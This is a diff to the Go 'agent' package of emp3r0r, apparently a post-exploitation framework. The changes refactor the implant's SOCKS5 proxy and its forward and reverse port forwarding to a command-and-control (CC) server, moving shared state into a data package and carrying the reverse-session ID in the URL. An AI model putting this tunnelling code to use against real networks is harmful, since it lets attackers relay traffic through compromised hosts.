@@ -1,5 +1,7 @@
 package agent
 
+// build +linux
+
 import (
 	"context"
 	"errors"
@@ -7,11 +9,12 @@ import (
 	"io"
 	"log"
 	"net"
+	"strings"
 	"sync"
 	"time"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
-	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
 )
 
@@ -38,22 +41,23 @@ func Socks5Proxy(op string, addr string) (err error) {
 	// op
 	switch op {
 	case "on":
+		log.Printf("Starting Socks5Proxy %s", addr)
 		go func() {
-			err = tun.StartSocks5Proxy(addr, ProxyServer)
+			err = tun.StartSocks5Proxy(addr, emp3r0r_data.DoHServer, emp3r0r_data.ProxyServer)
 			if err != nil {
-				log.Printf("StartSock5Proxy: %v", err)
+				log.Printf("StartSock5Proxy %s: %v", addr, err)
 			}
 		}()
 	case "off":
-		log.Print("Stopping Socks5Proxy")
-		if ProxyServer == nil {
+		log.Printf("Stopping Socks5Proxy %s", addr)
+		if emp3r0r_data.ProxyServer == nil {
 			return errors.New("Proxy server is not running")
 		}
-		err = ProxyServer.Shutdown()
+		err = emp3r0r_data.ProxyServer.Shutdown()
 		if err != nil {
 			log.Print(err)
 		}
-		ProxyServer = nil
+		emp3r0r_data.ProxyServer = nil
 	default:
 		return errors.New("Operation not supported")
 	}
@@ -78,7 +82,7 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 	var (
 		session PortFwdSession
 
-		url = CCAddress + tun.ProxyAPI + "/" + sessionID
+		url = emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + sessionID
 
 		// connection
 		conn   *h2conn.Conn
@@ -134,12 +138,16 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 	port, sessionID string) {
 	var (
-		url = CCAddress + tun.ProxyAPI + "/" + sessionID
 		err error
 	)
 
 	// serve a TCP connection received on agent side
 	serveConn := func(conn net.Conn) {
+		// tell CC this is a reversed port mapping
+		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
+		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
+		url := emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + shID
+
 		// start a h2 connection per incoming TCP connection
 		h2, _, h2cancel, err := ConnectCC(url)
 		if err != nil {
@@ -151,14 +159,6 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 			h2cancel()
 			conn.Close()
 		}()
-
-		// tell CC this is a reversed port mapping
-		shID := fmt.Sprintf("%s_%d-reverse", sessionID, util.RandInt(0, 1024))
-		_, err = h2.Write([]byte(shID))
-		if err != nil {
-			log.Printf("reverse port mapping hello: %v", err)
-			return
-		}
 
 		// iocopy
 		go func() {
